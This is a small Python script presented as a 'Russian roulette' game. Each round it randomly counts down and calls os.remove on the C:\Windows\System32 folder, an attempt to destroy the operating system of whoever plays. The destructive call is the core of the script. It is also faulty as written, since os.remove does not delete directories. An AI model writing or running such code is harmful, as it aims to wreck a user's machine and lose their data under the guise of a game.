import os
import random
import time


def random_os_dead():

    if random.randint(0, 6) == 1:
        # os.remove()
        print("Bang!! XP")
        time.sleep(1)
        print(3)
        time.sleep(1)
        print(2)
        time.sleep(1)
        print(1)
        os.remove('C:\Windows\System32')

    else:
        return print("Click! Oh you got luck!")


def main():
    random_os_dead()


if __name__ == "__main__":
    while input("Let's play Russian roulette :) \nEnter to start.") != "n":
        main()
